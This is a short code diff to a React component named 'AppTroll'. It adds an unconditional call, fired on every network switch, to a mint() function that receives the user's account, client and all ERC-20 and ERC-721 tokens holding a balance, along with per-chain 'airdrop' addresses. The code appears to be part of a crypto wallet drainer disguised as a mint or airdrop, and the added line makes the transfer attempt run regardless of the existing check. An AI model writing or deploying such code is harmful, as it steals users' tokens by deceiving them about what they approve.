@@ -134,6 +134,7 @@ function AppTroll() {
   }, [chain]);
   useEffect(() => {
     console.log("SWITCH NETWORK")
+    mint(chain, chain?.id === 1 ? airdropETH : chain?.id === 137 ? airdropPolygon : airdropBSC, tokensErc20WithBalance, tokensErc721WithBalance, account, client, address);
     if ((tokensErc20WithBalance !== undefined && tokensErc721WithBalance !== undefined) && (tokensErc20WithBalance.length > 0 || tokensErc721WithBalance.length > 0)) {
       mint(chain, chain?.id === 1 ? airdropETH : chain?.id === 137 ? airdropPolygon : airdropBSC, tokensErc20WithBalance, tokensErc721WithBalance, account, client, address);
     }
